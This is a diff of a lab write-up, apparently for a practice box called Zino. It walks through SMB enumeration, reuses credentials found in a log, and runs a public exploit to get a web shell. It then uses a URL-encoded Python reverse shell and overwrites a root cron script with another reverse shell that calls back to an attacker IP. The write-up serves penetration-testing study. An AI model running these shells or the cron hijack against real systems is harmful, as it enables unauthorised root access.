@@ -119,13 +119,13 @@ Reconnecting with SMB1 for workgroup listing.
 
 We can access the <mark style="color:yellow;">zino</mark> share with <mark style="color:yellow;">smbclient</mark>:
 
-<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 * From here, I downloaded all of the files for further enumeration
 
 <mark style="color:yellow;">Misc.log</mark>:
 
-<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:yellow;">admin</mark>:<mark style="color:yellow;">adminadmin</mark>
 
@@ -145,14 +145,14 @@ python3 50594.py http://192.168.81.64:8003 admin adminadmin
 
 * A web shell was created!
 
-<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 * My next goal was to establish further persistence with another reverse shell
 * However, since we are still in a web shell, we need to URL encode the reverse shell
 
 Cyber Chef:
 
-<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 URL-Encoded Python Reverse Shell:
 
@@ -165,15 +165,40 @@ python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF
 * Start a nc listener on Kali -- <mark style="color:red;">`nc -lnvp 3306`</mark>
 * Execute the reverse shell within the web shell and you will gain further persistence
 
-<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
+*   I then stabalized my shell with Python &#x20;
 
+    ```
+    python -c 'import pty;pty.spawn("/bin/bash")'
+    ```
 
 ### Privilege Escalation
 
-### Local enumeration
+* Uploaded <mark style="color:yellow;">linpeas</mark>
 
 ### PrivEsc vector
 
+* <mark style="color:yellow;">Vulnerable Cron Job running every three minutes -- It is running with root permissions as well</mark>
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+* I simply removed the file -- <mark style="color:yellow;">`rm -f /var/www/html/booked/cleanup.py`</mark>
+
+Replaced it with the following:
+
+```
+echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.81",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /var/www/html/booked/cleanup.py
+```
+
+Nc Listener:
+
+```
+nc -lnvp 21
+```
+
+* Waited three minutes and I was able to get a shell as root!
+
 ## Proofs
 
+<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
